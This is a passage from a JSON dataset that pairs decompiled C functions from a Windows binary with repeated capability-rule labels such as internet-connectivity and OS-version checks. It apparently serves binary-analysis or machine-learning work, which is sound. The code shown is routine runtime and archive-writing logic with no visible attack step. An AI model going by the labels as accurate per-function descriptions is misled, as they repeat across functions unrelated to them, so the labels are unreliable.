        "decompiled_code": "\nuint32_t __cdecl fcn.0041c68b(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t arg_10h;\n    uchar uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    \n    arg_10h = arg_ch;\n    uVar3 = arg_8h;\n    if (*(in_ECX + 0x2d) != '\\0') {\n        uVar3 = 0;\n        if ((*(in_ECX + 0x3c) != 0) && (*(in_ECX + 0x40) < arg_ch)) {\n            fcn.0041e801(*(in_ECX + 0x3c));\n            *(in_ECX + 0x3c) = 0;\n        }\n        if (*(in_ECX + 0x3c) == 0) {\n            uVar2 = fcn.0041e85d(arg_10h * 2);\n            *(in_ECX + 0x3c) = uVar2;\n            *(in_ECX + 0x40) = arg_10h;\n        }\n        fcn.00420150(*(in_ECX + 0x3c), arg_8h, arg_10h);\n        if (arg_10h != 0) {\n            do {\n                uVar1 = fcn.0041c2b2(*(uVar3 + *(in_ECX + 0x3c)));\n                *(uVar3 + *(in_ECX + 0x3c)) = uVar1;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < arg_10h);\n        }\n        uVar3 = *(in_ECX + 0x3c);\n    }\n    if (*(in_ECX + 0x20) == 0) {\n        if (*(in_ECX + 4) != 0) {\n            (**0x4463ac)(*(in_ECX + 4), uVar3, arg_10h, &arg_8h, 0);\n            return arg_8h;\n        }\n        *(in_ECX + 0x14) = 0x1000000;\n    }\n    else {\n        if (*(in_ECX + 0x24) + arg_10h < *(in_ECX + 0x28)) {\n            fcn.00420150(*(in_ECX + 0x24) + *(in_ECX + 0x20), uVar3, arg_10h);\n            *(in_ECX + 0x24) = *(in_ECX + 0x24) + arg_10h;\n            return arg_10h;\n        }\n        *(in_ECX + 0x14) = 0x30000;\n    }\n    return 0;\n}\n",
        "token_count": 626
    },
    "0041cba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041cba0(void)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_ESI;\n    \n    if ((*(unaff_ESI + 0x80) != '\\0') && (*(unaff_ESI + 0x7c) != 0)) {\n        (**0x446344)(*(unaff_ESI + 0x7c));\n    }\n    *(unaff_ESI + 0x7c) = 0;\n    if ((*(unaff_ESI + 0x70) == -1) || (*(unaff_ESI + 0x70) == *(unaff_ESI + 0x74))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(unaff_ESI + 0x70) = *(unaff_ESI + 0x74);\n    return -uVar1 & 0x60000;\n}\n",
        "token_count": 210
    },
    "0041cd3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041cd3e(char *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int16_t iVar4;\n    char cVar5;\n    uchar uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint in_ECX;\n    char **in_EDX;\n    uint unaff_ESI;\n    char *pcVar13;\n    ushort *puVar14;\n    uint *puVar15;\n    bool bVar16;\n    int32_t var_4ach;\n    uint var_4a8h;\n    int32_t var_4a4h;\n    uint var_49dh;\n    uint16_t var_498h;\n    int16_t var_496h;\n    char *var_494h;\n    char *var_490h;\n    char *var_48ch;\n    char *var_488h;\n    int32_t var_484h;\n    int32_t var_480h;\n    uint var_47ch;\n    uint var_478h;\n    ushort var_474h;\n    uint var_472h;\n    char *var_46ch;\n    char *var_468h;\n    uint var_464h;\n    uint *var_360h;\n    uint *var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_250h;\n    uint var_14ch;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uchar var_29h;\n    uint var_28h;\n    uint var_34h;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_17h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x443674 ^ &stack0xfffffffc;\n    if ((in_EDX[5] != NULL) || (*(in_EDX + 0xb) != '\\0')) goto code_r0x0041d363;\n    var_4ach = 0;\n    if ((*in_EDX != NULL) && (arg_10h != 4)) {\n        var_4ach = 0xc;\n    }\n    iVar8 = &var_13ch - arg_8h;\n    do {\n        cVar5 = *arg_8h;\n        arg_8h[iVar8] = cVar5;\n        arg_8h = arg_8h + 1;\n    } while (cVar5 != '\\0');\n    if (var_13ch == '\\0') goto code_r0x0041d363;\n    puVar7 = &var_13ch;\n    do {\n        if (*puVar7 == '\\\\') {\n            *puVar7 = '/';\n        }\n        puVar7 = puVar7 + 1;\n    } while (*puVar7 != '\\0');\n    var_49dh._0_1_ = arg_10h == 4;\n    if (var_49dh) {\n        puVar7 = &var_13ch;\n        do {\n            puVar15 = puVar7;\n            puVar7 = puVar15 + 1;\n        } while (*puVar15 != '\\0');\n        bVar16 = true;\n        if (*(puVar15 + -1) == '/') goto code_r0x0041ce03;\n    }\n    else {\ncode_r0x0041ce03:\n        bVar16 = false;\n    }\n    iVar4 = 8;\n    if ((var_49dh) || (cVar5 = fcn.0041c2dc(),  cVar5 != '\\0')) {\n        iVar4 = 0;\n    }\n    if (arg_10h == 2) {\n        iVar8 = fcn.0041c800(in_ECX);\n    }\n    else if (arg_10h == 1) {\n        iVar8 = fcn.0041c87b(in_ECX, arg_ch);\n    }\n    else if (arg_10h == 3) {\n        iVar8 = fcn.0041c99e();\n    }\n    else {\n        if (arg_10h != 4) goto code_r0x0041d363;\n        iVar8 = fcn.0041ca61();\n    }\n    if (iVar8 == 0) {\n        var_140h = 0;\n        var_464h._0_1_ = 0;\n        do {\n            pcVar13 = &var_13ch + iVar8;\n            *(&var_354h + iVar8) = *pcVar13;\n            iVar8 = iVar8 + 1;\n        } while (*pcVar13 != '\\0');\n        puVar7 = &var_354h;\n        do {\n            cVar5 = *puVar7;\n            puVar7 = puVar7 + 1;\n        } while (cVar5 != '\\0');\n        var_484h = puVar7 - (&var_354h + 1);\n        if (bVar16) {\n            puVar14 = &var_358h + 3;\n            do {\n                pcVar13 = puVar14 + 1;\n                puVar14 = puVar14 + 1;\n            } while (*pcVar13 != '\\0');\n            *puVar14 = *0x43e100;\n            var_484h = var_484h + 1;\n        }\n        var_472h._0_2_ = 0;\n        var_49dh._1_2_ = 0xb17;\n        *NULL = 0x14;\n        var_494h = in_EDX[0x1a];\n        var_250h._0_1_ = 0;\n        var_358h = 0;\n        var_478h = 0;\n        var_14ch = 1;\n        var_144h = 0;\n        var_490h = NULL;\n        var_498h = 8;\n        if ((*in_EDX != NULL) && (var_49dh == '\\0')) {\n            var_498h = 9;\n        }\n        var_472h._2_2_ = var_498h;\n        if ((iVar4 == 0) && (-1 < in_EDX[0x1c])) {\n            var_48ch = in_EDX[0x1c] + var_4ach;\n        }\n        else {\n            var_48ch = NULL;\n        }\n        var_488h = in_EDX[0x1c];\n        pcVar13 = in_EDX[0x16];\n        var_474h = 0;\n        var_46ch = in_EDX[0x13];\n        var_468h = in_EDX[6] + in_EDX[4];\n        var_47ch = 9;\n        var_360h = &var_1ch;\n        var_35ch = &var_28h;\n        pcVar2 = in_EDX[0x14];\n        var_17h._3_1_ = pcVar13 >> 0x18;\n        var_13h = *(in_EDX + 0x14);\n        var_12h = pcVar2 >> 8;\n        var_11h = pcVar2 >> 0x10;\n        pcVar3 = in_EDX[0x18];\n        var_10h = pcVar2 >> 0x18;\n        var_fh = *(in_EDX + 0x18);\n        var_eh = pcVar3 >> 8;\n        var_dh = pcVar3 >> 0x10;\n        var_ch = pcVar3 >> 0x18;\n        var_1ch = 0xd5455;\n        _var_18h = CONCAT31(CONCAT12(pcVar13 >> 0x10, CONCAT11(pcVar13 >> 8, *(in_EDX + 0x16))), 7);\n        var_480h = 0x11;\n        var_28h = 0x55455;\n        var_496h = iVar4;\n        iVar8 = fcn.0041b8d0();\n        if (iVar8 == 0) {\n            in_EDX[6] = in_EDX[6] + var_480h + 0x1e + var_484h;\n            if (in_EDX[5] == NULL) {\n                pcVar13 = *in_EDX;\n                in_EDX[0xc] = 0x12345678;\n                in_EDX[0xd] = 0x23456789;\n                in_EDX[0xe] = 0x34567890;\n                for (; (pcVar13 != NULL && (*pcVar13 != '\\0')); pcVar13 = pcVar13 + 1) {\n                    fcn.0041c26c();\n                }\n                if (*0x44679c == '\\0') {\n                    uVar9 = (**0x446304)();\n                    uVar10 = (**0x446518)();\n                    fcn.0041fe1e(uVar9 ^ uVar10);\n                }\n                iVar8 = 0;\n                do {\n                    iVar11 = fcn.0041fe30();\n                    *(&var_34h + iVar8) = iVar11 >> 7;\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                var_29h = var_494h >> 8;\n                iVar8 = 0;\n                do {\n                    puVar1 = &var_34h + iVar8;\n                    uVar6 = fcn.0041c2b2(*puVar1);\n                    iVar8 = iVar8 + 1;\n                    *puVar1 = uVar6;\n                } while (iVar8 < 0xc);\n                if ((*in_EDX != NULL) && (var_49dh == '\\0')) {\n                    fcn.0041c68b(&var_34h, 0xc);\n                    in_EDX[6] = in_EDX[6] + 0xc;\n                }\n                var_4a4h = 0;\n                if ((*in_EDX == NULL) || (var_49dh != '\\0')) {\n                    uVar6 = 0;\n                }\n                else {\n                    uVar6 = 1;\n                }\n                *(in_EDX + 0x2d) = uVar6;\n                if (var_49dh == '\\0') {\n                    if (iVar4 == 8) {\n                        var_4a4h = fcn.0041cbe1(&var_49dh + 1);\n                    }\n                    else if (iVar4 == 0) {\n                        var_4a4h = fcn.0041cce6();\n                    }\n                }\n                else {\n                    in_EDX[0x24] = NULL;\n                }\n                *(in_EDX + 0x2d) = 0;\n                fcn.0041cba0();\n                in_EDX[6] = in_EDX[6] + in_EDX[0x24];\n                if ((in_EDX[5] == NULL) && (var_4a4h == 0)) {\n                    var_490h = in_EDX[0x1e];\n                    pcVar13 = in_EDX[0x24] + var_4ach;\n                    bVar16 = var_48ch != pcVar13;\n                    var_488h = in_EDX[0x1c];\n                    var_48ch = pcVar13;\n                    if ((*(in_EDX + 7) == '\\0') || ((*in_EDX != NULL && (var_49dh == '\\0')))) {\n                        if (((var_496h != iVar4) || ((iVar4 == 0 && (bVar16)))) || (iVar8 = fcn.0041bb32(),  iVar8 != 0)\n                           ) goto code_r0x0041d363;\n                        in_EDX[6] = in_EDX[6] + 0x10;\n                        var_498h = var_472h._2_2_;\n                    }\n                    else {\n                        if ((var_498h & 1) == 0) {\n                            var_498h = var_498h & 0xfff7;\n                        }\n                        var_472h._2_2_ = var_498h;\n                        var_496h = iVar4;\n                        cVar5 = fcn.0041c758();\n                        if (((cVar5 == '\\0') || (iVar8 = fcn.0041b8d0(),  iVar8 != 0)) ||\n                           (cVar5 = fcn.0041c758(),  cVar5 == '\\0')) goto code_r0x0041d363;\n                    }\n                    if (in_EDX[5] == NULL) {\n                        puVar7 = fcn.0041e85d(var_47ch);\n                        fcn.00420150(puVar7, var_35ch, var_47ch);\n                        var_35ch = puVar7;\n                        puVar12 = fcn.0041e85d(0x360);\n                        puVar7 = &var_49dh + 1;\n                        puVar15 = puVar12;\n                        for (iVar8 = 0xd8; iVar8 != 0; iVar8 = iVar8 + -1) {\n                            *puVar15 = *puVar7;\n                            puVar7 = puVar7 + 1;\n                            puVar15 = puVar15 + 1;\n                        }\n                        pcVar13 = in_EDX[0x11];\n                        if (pcVar13 == NULL) {\n                            in_EDX[0x11] = puVar12;\n                        }\n                        else {\n                            for (; *(pcVar13 + 0x35c) != NULL; pcVar13 = *(pcVar13 + 0x35c)) {\n                            }\n                            *(pcVar13 + 0x35c) = puVar12;\n                        }\n                    }\n                }\n            }\n            else {\n                fcn.0041cba0();\n            }\n        }\n        else {\n            fcn.0041cba0();\n        }\n    }\ncode_r0x0041d363:\n    fcn.0041e0a1(unaff_ESI);\n    return;\n}\n",
        "token_count": 3199
    },
    "0041d374": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0041d374(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    iVar4 = *(in_EAX + 0x18);\n    bVar1 = true;\n    iVar2 = *(in_EAX + 0x44);\n    while (iVar2 != 0) {\n        if ((bVar1) && (iVar3 = fcn.0041bc57(),  iVar3 != 0)) {\n            bVar1 = false;\n        }\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) + *(iVar2 + 0x24) + *(iVar2 + 0x20) + 0x2e + *(iVar2 + 0x18);\n        var_8h = var_8h + 1;\n        iVar3 = *(iVar2 + 0x35c);\n        if (*(iVar2 + 0x140) != 0) {\n            fcn.0041e801(*(iVar2 + 0x140));\n        }\n        fcn.0041e801(iVar2);\n        iVar2 = iVar3;\n    }\n    if (bVar1) {\n        iVar4 = fcn.0041bff5(var_8h, *(in_EAX + 0x18) - iVar4);\n        if (iVar4 != 0) {\n            bVar1 = false;\n        }\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) + 0x16;\n        if (bVar1) {\n            return 0;\n        }\n    }\n    return 0x400;\n}\n",
        "token_count": 428
    },
    "0041d51e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d51e(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *unaff_EDI;\n    \n    if (in_EAX == NULL) {\n        if (unaff_EDI != NULL) {\n            *unaff_EDI = 0;\n        }\n        if (param_1 != NULL) {\n            *param_1 = 0;\n        }\n        *0x4467a0 = 0x10000;\n    }\n    else if (*in_EAX == 2) {\n        iVar1 = in_EAX[1];\n        if (*(iVar1 + 0x2c) == '\\0') {\n            fcn.0041d374();\n        }\n        *(iVar1 + 0x2c) = 1;\n        if (unaff_EDI != NULL) {\n            *unaff_EDI = *(iVar1 + 0x20);\n        }\n        if (param_1 != NULL) {\n            *param_1 = *(iVar1 + 0x18);\n        }\n        *0x4467a0 = (-(*(iVar1 + 0x20) != 0) & 0xfffe0000) + 0x20000;\n    }\n    else {\n        *0x4467a0 = 0x80000;\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0041dd0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041dd0c(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = arg_ch & 4;\n    uVar2 = arg_ch & 0x80;\n    uVar1 = 1;\n    if ((arg_ch & 0x40) != 0) {\n        arg_ch = arg_ch | 1;\n    }\n    if ((arg_ch & 8) != 0) {\n        arg_ch = arg_ch | 2;\n    }\n    iVar4 = 0;\n    do {\n        if (uVar1 == (arg_ch & 0xffffff3b)) break;\n        uVar1 = *(iVar4 * 4 + 0x434340);\n        iVar4 = iVar4 + 1;\n    } while (uVar1 != 0);\n    if (*(iVar4 * 4 + 0x43433c) != 0) {\n        if (((uVar2 == 0) || ((arg_ch & 10) == 0)) || (arg_8h_00 = fcn.0041dc45(arg_8h, 0, arg_10h),  arg_8h_00 == 0)) {\n            arg_8h_00 = fcn.0041dc45(arg_8h, iVar4, arg_10h);\n            if (arg_8h_00 == 0) {\n                return 0;\n            }\n            if (uVar3 == 0) {\n                return arg_8h_00;\n            }\n            iVar4 = fcn.00421832(arg_8h_00, 0, 2);\n            if (iVar4 == 0) {\n                return arg_8h_00;\n            }\n        }\n        fcn.0041fbd2(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 455
    },
    "0041e0a1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e0a1(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x443674) {\n        return;\n    }\n    *0x444df8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x444dfc = &arg_8h;\n    *0x444d38 = 0x10001;\n    *0x444ce0 = 0xc0000409;\n    *0x444ce4 = 1;\n    var_328h = *0x443674;\n    var_324h = *0x443678;\n    *0x444cec = unaff_retaddr;\n    *0x444dc4 = in_GS;\n    *0x444dc8 = in_FS;\n    *0x444dcc = in_ES;\n    *0x444dd0 = in_DS;\n    *0x444dd4 = unaff_EDI;\n    *0x444dd8 = unaff_ESI;\n    *0x444ddc = unaff_EBX;\n    *0x444de0 = in_EDX;\n    *0x444de4 = in_ECX;\n    *0x444de8 = in_EAX;\n    *0x444dec = unaff_EBP;\n    *0x444df0 = unaff_retaddr;\n    *0x444df4 = in_CS;\n    *0x444e00 = in_SS;\n    *0x444d30 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0042bde5(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x434d60);\n    if (*0x444d30 == 0) {\n        fcn.0042bde5(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 824
    },
    "0041e0b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e0b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x445004, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004221b6();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00422174(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "004205a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004205a7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x420652;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0042067e;\n        uStack36 = *0x443674 ^ &fcn.004205a7::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004205a7::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.004253d5();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004205a7::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 721
    },
    "004222df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004222df(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x43ff40, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.004253d5();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.00427ee7();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.00427f30(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004223a1();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.00427ee7();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 570
    },
    "004223a1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004223a1(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004253d5();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.004253d5();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00422679": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422679(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004207e3(*(unaff_EBP + -0x28));\n    iVar1 = fcn.004253d5();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.004253d5();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004207bc(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00422400(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0042328c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00423392: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00423397)\n// WARNING: Removing unreachable block (ram,0x004233c6)\n// WARNING: Removing unreachable block (ram,0x0042339d)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042328c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x440080, 0x20);\n    fcn.00426252(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x445038 != 1) {\n        *0x445034 = 1;\n        *0x445030 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = 